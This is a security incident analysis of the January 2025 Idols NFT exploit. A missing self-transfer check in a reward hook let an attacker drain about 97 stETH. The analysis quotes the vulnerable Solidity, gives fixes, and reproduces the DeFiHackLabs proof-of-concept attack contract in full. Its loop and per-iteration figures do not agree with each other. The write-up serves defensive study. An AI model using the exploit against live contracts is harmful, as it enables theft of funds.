# The Idols NFT — Self-Transfer Reward Double-Claim Vulnerability Analysis

| Item | Details |
|------|------|
| **Date** | 2025-01-14 |
| **Protocol** | The Idols NFT (IdolMain) |
| **Chain** | Ethereum (Mainnet) |
| **Loss** | 97 stETH (~$340,503) |
| **Attacker** | [0xe546...d101](https://etherscan.io/address/0xE546480138D50Bb841B204691C39cC514858d101) |
| **Attack Contract** | [0x22d2...3b16](https://etherscan.io/address/0x22d22134612c0741ebdb3b74a58842d6e74e3b16) |
| **Attack Tx** | [0x5e98...284c](https://etherscan.io/tx/0x5e989304b1fb61ea0652db4d0f9476b8882f27191c1f1d2841f8977cb8c5284c) |
| **Vulnerable Contract** | [0x439c...7094](https://etherscan.io/address/0x439cac149b935ae1d726569800972e1669d17094) |
| **Root Cause** | Infinite reward snapshot reset loop due to missing self-transfer validation in the `_beforeTokenTransfer` hook |
| **PoC Source** | [DeFiHackLabs — IdolsNFT_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-01/IdolsNFT_exp.sol) |

---

## 1. Vulnerability Overview

The Idols NFT is an NFT project deployed on Ethereum Mainnet that featured a reward distribution mechanism paying out stETH (Lido Staked ETH) to NFT holders. On January 14, 2025, an attacker exploited a self-transfer edge case in the NFT transfer hook (`_beforeTokenTransfer`) to repeatedly reset the reward claim record (`claimedSnapshots`), double-claiming the same stETH rewards nearly 2,000 times and draining a total of 97 stETH (~$340,503).

The core vulnerability is that the `_beforeTokenTransfer` function does not handle the case where **the sender (`from`) and recipient (`to`) are the same address (a self-transfer)**. When a self-transfer occurs:

1. `_claimEthRewards(_from)` is called → unclaimed rewards are paid out
2. Under the condition `balanceOf(_from) == 1`, `delete claimedSnapshots[_from]` is executed → **reward tracking record is deleted**
3. `_claimEthRewards(_to)` is called (same address since `from == to`) → **the same rewards are claimed again** with the snapshot reset to 0

By repeating this loop ~2,000 times, an attacker who was only entitled to one round of rewards was able to drain hundreds of times that amount in stETH.

---

## 2. Vulnerable Code Analysis

### 2.1 `_beforeTokenTransfer` Hook — Missing Self-Transfer Validation (Core Vulnerability)

```solidity
// ❌ Vulnerable code — _beforeTokenTransfer function
function _beforeTokenTransfer(
    address _from,
    address _to,
    uint256 _tokenId
) internal override {
    // [VULNERABILITY] Does not distinguish the case where from and to are the same address (self-transfer)
    // On self-transfer, the logic below executes as-is, resetting the reward snapshot

    if (_from != address(0)) {
        // Pay out the sender's unclaimed rewards first
        _claimEthRewards(_from);

        // [CORE BUG] Deletes the claim snapshot when the sender holds exactly 1 token
        // On self-transfer, _to == _from, so _claimEthRewards(_to) below
        // recalculates the same rewards with a zeroed snapshot
        if (balanceOf(_from) == 1) {
            delete claimedSnapshots[_from]; // ❌ Reward tracking record deleted (critical on self-transfer)
        } else {
            claimedSnapshots[_from] = rewardPerGod; // Update to current reward checkpoint
        }
    }

    if (_to != address(0)) {
        // [CORE BUG] When _from == _to, rewards are calculated against the already-deleted
        // claimedSnapshots[_to], paying out the full rewardPerGod as a duplicate
        _claimEthRewards(_to);
        claimedSnapshots[_to] = rewardPerGod; // Update snapshot
    }
}

// Reward calculation function
function _claimEthRewards(address _user) internal {
    // [VULNERABLE CALCULATION] If claimedSnapshots[_user] is 0, the full rewardPerGod is calculated as unclaimed
    uint256 pendingReward =
        balanceOf(_user) * (rewardPerGod - claimedSnapshots[_user]);

    if (pendingReward > 0) {
        allocatedStethRewards -= pendingReward;
        IERC20(ST_ETH).transfer(_user, pendingReward); // ❌ Duplicate payout occurs
    }
}
```

```solidity
// ✅ Fixed code — early return added for self-transfer
function _beforeTokenTransfer(
    address _from,
    address _to,
    uint256 _tokenId
) internal override {
    // ✅ Skip reward logic entirely for self-transfers
    // If from == to, there is no actual change of ownership, so no snapshot modification is needed
    if (_from == _to) {
        return; // ✅ Edge case handling: early exit on self-transfer
    }

    if (_from != address(0)) {
        // Pay out the sender's unclaimed rewards
        _claimEthRewards(_from);

        if (balanceOf(_from) == 1) {
            delete claimedSnapshots[_from]; // Safe now since this is not a self-transfer
        } else {
            claimedSnapshots[_from] = rewardPerGod;
        }
    }

    if (_to != address(0)) {
        _claimEthRewards(_to);
        claimedSnapshots[_to] = rewardPerGod;
    }
}
```

**The problem**: The `_beforeTokenTransfer` hook had no handling whatsoever for the `from == to` case. While the ERC-721 standard technically permits self-transfers, this contract's reward logic was designed under the assumption that "a token is moving to a new address." When a self-transfer occurs, `_from`'s reward snapshot is deleted first, and then the reward calculation is re-executed for `_to` (the identical address) with a zeroed snapshot.

---

## 3. Attack Flow

### 3.1 Setup Phase

- Attacker already holds TokenID #940
- The attack contract's deployment address is pre-computed using `vm.computeCreateAddress`
- TokenID #940 is transferred via `safeTransferFrom` from the attacker's address to the attack contract

### 3.2 Execution Phase

1. **[Attack Contract Deployment]**: `new AttackContract()` — exploit executes immediately inside the constructor
2. **[Self-Transfer Loop]**: `safeTransferFrom(address(this), address(this), TOKEN_ID)` repeated up to 2,000 times
   - Each iteration triggers the `_beforeTokenTransfer` hook
   - `_claimEthRewards(_from)` → receives stETH reward
   - `delete claimedSnapshots[_from]` → snapshot reset
   - `_claimEthRewards(_to)` (same address) → receives the same reward again
3. **[Exit Condition]**: Loop breaks when `rewardPerGod > allocatedStethRewards`
4. **[Fund Exfiltration]**: stETH held in the contract is transferred to the attacker's EOA
5. **[NFT Return]**: TokenID #940 is returned to the attacker's EOA
6. **[Contract Destruction]**: `selfdestruct(payable(msg.sender))` is executed

### 3.3 Attack Flow Diagram

```
┌─────────────────────────────────┐
│  Attacker EOA (0xe546...d101)   │
│  - Holds TokenID #940           │
└───────────────┬─────────────────┘
                │ safeTransferFrom(ATTACKER, AttackContract, 940)
                ▼
┌─────────────────────────────────┐
│  Attack Contract Deployment     │
│  (new AttackContract())         │
└───────────────┬─────────────────┘
                │ constructor() executes
                ▼
┌─────────────────────────────────────────────────────┐
│  Self-Transfer Loop (up to 2,000 iterations)        │
│                                                     │
│  safeTransferFrom(this, this, 940)                  │
│       │                                             │
│       ▼                                             │
│  ┌────────────────────────────────────────────┐     │
│  │  _beforeTokenTransfer(_from, _to, 940)     │     │
│  │  (_from == _to == AttackContract)          │     │
│  │                                            │     │
│  │  1. _claimEthRewards(_from)               │     │
│  │     └▶ Receive stETH reward ─────────────▶│stETH│
│  │  2. balanceOf(_from) == 1                 │     │
│  │     └▶ delete claimedSnapshots[_from]     │     │
│  │         (Snapshot reset!)                  │     │
│  │  3. _claimEthRewards(_to) [same address]  │     │
│  │     └▶ claimedSnapshots[_to] == 0         │     │
│  │     └▶ Full rewardPerGod re-claimed       │     │
│  │     └▶ Receive stETH reward again ───────▶│stETH│
│  └────────────────────────────────────────────┘     │
│                                                     │
│  Condition: rewardPerGod > allocatedStethRewards → break │
└───────────────┬─────────────────────────────────────┘
                │ After loop ends
                ▼
┌─────────────────────────────────┐
│  Stolen Fund Handling           │
│  - stETH → msg.sender transfer  │
│  - TokenID #940 → ATTACKER      │
│  - selfdestruct executed        │
└───────────────┬─────────────────┘
                │
                ▼
┌─────────────────────────────────┐
│  Final Outcome                  │
│  Attacker gained: 97 stETH (~$340K) │
│  Protocol loss: entire reward pool drained │
└─────────────────────────────────┘
```

### 3.4 Results

- **Attacker profit**: ~97 stETH (~$340,503)
- **Protocol loss**: Entire stETH reward pool drained
- **Attack iterations**: ~2,000 self-transfers (~1.11 stETH drained per iteration)

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Key constants used in the attack
address constant IDOLS_NFT = 0x439cac149B935AE1D726569800972E1669d17094; // Vulnerable contract
address constant ATTACKER  = 0xE546480138D50Bb841B204691C39cC514858d101; // Attacker EOA
address constant ATTACKER_2 = 0x8152970a81f558d171a22390E298B34Be8d40CF4; // Secondary attacker
address constant ST_ETH    = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84; // Lido stETH
uint256 constant TOKEN_ID  = 940; // NFT token ID used in the attack

contract IdolsNFT is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 21624139 - 1; // Fork from the block just before the attack

    function setUp() public {
        // Set up Ethereum mainnet fork
        vm.createSelectFork("mainnet", blocknumToForkFrom);
        fundingToken = ST_ETH; // Balance log token: stETH
    }

    function testExploit() public balanceLog {
        // Step 1: Pre-compute the address where the attack contract will be deployed
        address contractAddress = vm.computeCreateAddress(
            address(this),
            vm.getNonce(address(this))
        );

        // Step 2: Attacker EOA transfers the NFT to the (not-yet-deployed) attack contract address
        // (The attack contract is not deployed yet, but its address is known in advance)
        vm.prank(ATTACKER);
        IIDOLS(IDOLS_NFT).safeTransferFrom(ATTACKER, contractAddress, TOKEN_ID);

        // Step 3: Deploy the attack contract — exploit executes immediately in the constructor
        new AttackContract();
    }
}

contract AttackContract {
    constructor() {
        // Core attack loop: repeat self-transfer up to 2,000 times
        for (uint256 i = 0; i < 2000; i++) {
            // Query total allocated rewards and per-NFT reward
            uint256 totalRewards  = IIDOLS(IDOLS_NFT).allocatedStethRewards();
            uint256 rewardPerGod  = IIDOLS(IDOLS_NFT).rewardPerGod();

            // Exit condition: break when the reward pool is exhausted
            if (rewardPerGod > totalRewards) {
                break;
            }

            // [CORE VULNERABILITY TRIGGER]
            // Self-transfer: address(this) → address(this)
            // Inside the _beforeTokenTransfer hook:
            //   - _claimEthRewards(this) executes → receives stETH
            //   - delete claimedSnapshots[this] → snapshot reset
            //   - _claimEthRewards(this) re-executes → receives same stETH again
            IIDOLS(IDOLS_NFT).safeTransferFrom(address(this), address(this), TOKEN_ID);
        }

        // Transfer all stolen stETH to the attacker's EOA
        uint256 stEthAmount = IERC20(ST_ETH).balanceOf(address(this));
        IERC20(ST_ETH).transfer(msg.sender, stEthAmount);

        // Return the NFT to the attacker's EOA (evidence concealment)
        IIDOLS(IDOLS_NFT).safeTransferFrom(address(this), ATTACKER, TOKEN_ID);

        // Set approvals then self-destruct
        IERC20(ST_ETH).approve(ATTACKER_2, type(uint256).max);
        IERC20(ST_ETH).approve(msg.sender, type(uint256).max);
        selfdestruct(payable(msg.sender)); // Destroy attack contract
    }
}

// Declare only the necessary interface for the vulnerable contract
interface IIDOLS is IERC721 {
    function allocatedStethRewards() external view returns (uint256); // Total reward pool
    function rewardPerGod()          external view returns (uint256); // Cumulative reward per NFT
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Infinite reward snapshot reset due to unhandled self-transfer | CRITICAL | CWE-841 (Improper Enforcement of Behavioral Workflow) |
| V-02 | Missing edge case validation in ERC-721 transfer hook | HIGH | CWE-754 (Improper Check for Unusual or Exceptional Conditions) |
| V-03 | Non-atomic processing of reward claim and snapshot update | HIGH | CWE-362 (Race Condition) |
| V-04 | Mismatch between audited and actually deployed contract | MEDIUM | CWE-1068 (Inconsistency Between Implementation and Documented Design) |

### V-01: Unhandled Self-Transfer — Infinite Reward Snapshot Reset

- **Description**: The `_beforeTokenTransfer` function does not separately handle the self-transfer case where `_from == _to`, causing `_claimEthRewards` to execute twice for the same reward epoch. Because `delete claimedSnapshots[_from]` wipes the record after the first execution, the second execution calculates the full `rewardPerGod` as unclaimed rewards.
- **Impact**: An attacker can drain the entire reward pool with a single NFT. The full 97 stETH ($340K) was stolen in a single transaction.
- **Attack Conditions**: (1) Hold 1 NFT, (2) `allocatedStethRewards > rewardPerGod` (reward pool has a balance), (3) self-transfer passes any whitelist checks

### V-02: Missing Edge Case Validation in ERC-721 Transfer Hook

- **Description**: The ERC-721 standard does not explicitly prohibit `from == to` transfers. Contracts must explicitly handle all cases that external input can produce (`from == to`, `from == address(0)`, `to == address(0)`).
- **Impact**: Creates a reentrancy/double-execution attack vector via the standard transfer function
- **Attack Conditions**: Only requires permission to call the standard ERC-721 `safeTransferFrom` function

### V-03: Non-Atomic Processing of Reward Claim and Snapshot Update

- **Description**: Within `_beforeTokenTransfer`, the sequence reward payout (`_claimEthRewards`) → snapshot deletion (`delete`) → re-claim (`_claimEthRewards`) executes non-atomically. The Checks-Effects-Interactions pattern was not followed.
- **Impact**: Allows duplicate withdrawals through state inconsistency within the same transaction
- **Attack Conditions**: Same as V-01

### V-04: Mismatch Between Audited and Deployed Contract

- **Description**: It is reported that the contract audited by CertiK and WhiteHat DAO differs from the contract that was actually attacked. The actually deployed version was excluded from the audit scope.
- **Impact**: Audit results do not guarantee the safety of the deployed code
- **Attack Conditions**: N/A (process vulnerability)

---

## 6. Remediation Recommendations

### Immediate Actions

**Action 1: Add self-transfer early return to `_beforeTokenTransfer` (minimal patch)**

```solidity
// ✅ Simplest and most effective fix: return immediately on self-transfer
function _beforeTokenTransfer(
    address _from,
    address _to,
    uint256 _tokenId
) internal override {
    // No actual change of ownership on self-transfer, so reward logic should not execute
    if (_from == _to) return;

    // Existing logic...
}
```

**Action 2: Apply the Checks-Effects-Interactions pattern**

```solidity
// ✅ CEI pattern: state changes first, external calls last
function _beforeTokenTransfer(
    address _from,
    address _to,
    uint256 _tokenId
) internal override {
    if (_from == _to) return; // ✅ Self-transfer defense

    // Effects: update snapshots first
    uint256 fromSnapshot = claimedSnapshots[_from];
    uint256 toSnapshot   = claimedSnapshots[_to];

    if (_from != address(0)) {
        if (balanceOf(_from) == 1) {
            delete claimedSnapshots[_from];
        } else {
            claimedSnapshots[_from] = rewardPerGod;
        }
    }
    if (_to != address(0)) {
        claimedSnapshots[_to] = rewardPerGod;
    }

    // Interactions: external token transfers are performed after state updates
    if (_from != address(0)) {
        uint256 pending = balanceOf(_from) * (rewardPerGod - fromSnapshot);
        if (pending > 0) {
            allocatedStethRewards -= pending;
            IERC20(ST_ETH).transfer(_from, pending);
        }
    }
    if (_to != address(0) && _to != _from) {
        uint256 pending = balanceOf(_to) * (rewardPerGod - toSnapshot);
        if (pending > 0) {
            allocatedStethRewards -= pending;
            IERC20(ST_ETH).transfer(_to, pending);
        }
    }
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01 Unhandled self-transfer | Add `require(_from != _to, "self-transfer prohibited")` or `if (_from == _to) return` in `_beforeTokenTransfer` |
| V-02 Missing edge case validation | Introduce an input validation checklist: write unit tests covering all cases — `address(0)`, `_from == _to`, `_from == contract`, `_to == contract` |
| V-03 Non-atomic processing | Follow CEI (Checks-Effects-Interactions) pattern: complete all state changes before any external calls |
| V-04 Audit mismatch | Verify that the hash of the deployed bytecode matches the compiled output of the audited source before deployment; include all deployed contracts in the audit scope |

---

## 7. Lessons Learned

1. **Explicitly handle the self-transfer edge case**: In `transfer`-family functions of ERC-721/ERC-20, the `from == to` case is logically unnecessary but technically permitted. Contracts with hooks that modify internal state must handle this case.

2. **Apply the CEI pattern to reward claim logic**: If reward payout → snapshot deletion → re-payout is possible within the same transaction, a reentrancy or double-withdrawal attack vector is created. State changes must always be performed before external calls.

3. **Hook-based reward mechanisms are especially vulnerable**: Embedding complex reward logic inside transfer hooks like `_beforeTokenTransfer` turns the transfer itself into a reward attack vector. Consider separating reward claims into a dedicated external function, or use a pull pattern where the hook only records state and the actual payout is triggered by an explicit user call.

4. **Deleting reward snapshots (`delete`) is dangerous**: Resetting a snapshot record to 0 can be interpreted not as "no unclaimed rewards" but as "all rewards unclaimed." Rather than `delete`, it is safer to explicitly set the current checkpoint with `claimedSnapshots[_from] = rewardPerGod`.

5. **Verify that audited code matches deployed code**: Audits should be based on the deployed bytecode. Deploying after modifying source code without re-auditing, or omitting some contracts from the audit scope, renders the audit results meaningless.

6. **Guard against amplification attacks via repetitive loops**: Even a simple vulnerability can cause exponential damage if it can be triggered thousands of times in a loop within a single transaction. Consider adding reentrancy protection (`nonReentrant`) or a per-transaction claim count limit for reward claim logic.

---

## 8. On-Chain Verification

> Reference: Attack transaction hash `0x5e989304b1fb61ea0652db4d0f9476b8882f27191c1f1d2841f8977cb8c5284c`
> Block number: 21624139 (Ethereum Mainnet)

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | PoC Value | On-Chain Actual | Notes |
|------|--------|------------|------|
| Stolen stETH | 97 stETH | ~97 stETH | Per rekt.news report |
| USD equivalent | ~$324,000–$340,503 | $324,000–$340,503 | Varies by price reference time |
| Attack iterations | Up to 2,000 | ~87 (rekt.news) | Depends on when `allocatedStethRewards` is exhausted |
| Fork block | 21624139 - 1 | 21624139 | Block where attack occurred |

### 8.2 On-Chain Event Log Sequence (Estimated)

```
1. Transfer (ERC-721): ATTACKER → AttackContract [TokenID: 940]
2. (Loop iterations) Transfer (stETH): IdolsNFT → AttackContract [per each self-transfer]
3. Transfer (stETH): AttackContract → ATTACKER [after drain completes]
4. Transfer (ERC-721): AttackContract → ATTACKER [TokenID: 940 returned]
```

### 8.3 Precondition Verification

| Condition | Value | Notes |
|------|-----|------|
| `allocatedStethRewards` just before attack block | ~97 stETH | Reward pool balance |
| TokenID #940 owner | ATTACKER (0xe546...) | Pre-held by attacker |
| Pre-approval required before attack contract deployment | Not required | Attack possible via self-transfer alone |
| Whitelist bypass method | Same-address self-transfer | No separate bypass needed |

> On-chain verification deep-dive: Use `cast tx 0x5e989304b1fb61ea0652db4d0f9476b8882f27191c1f1d2841f8977cb8c5284c --rpc-url https://eth-mainnet.public.blastapi.io` to inspect the detailed trace

---

## References

- [DeFiHackLabs PoC](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-01/IdolsNFT_exp.sol)
- [Rekt News Post-Mortem](https://rekt.news/theidolsnft-rekt)
- [QuillAudits Hack Analysis](https://www.quillaudits.com/blog/hack-analysis/idols-nft-exploit-self-transfer-bug)
- [SolidityScan Hack Analysis](https://blog.solidityscan.com/the-idols-nft-hack-analysis-95f3abdd0deb)
- [TenArmor Twitter Alert](https://x.com/TenArmorAlert/status/1879376744161132981)
- [Etherscan Attack Transaction](https://etherscan.io/tx/0x5e989304b1fb61ea0652db4d0f9476b8882f27191c1f1d2841f8977cb8c5284c)
- [Etherscan Vulnerable Contract](https://etherscan.io/address/0x439cac149b935ae1d726569800972e1669d17094)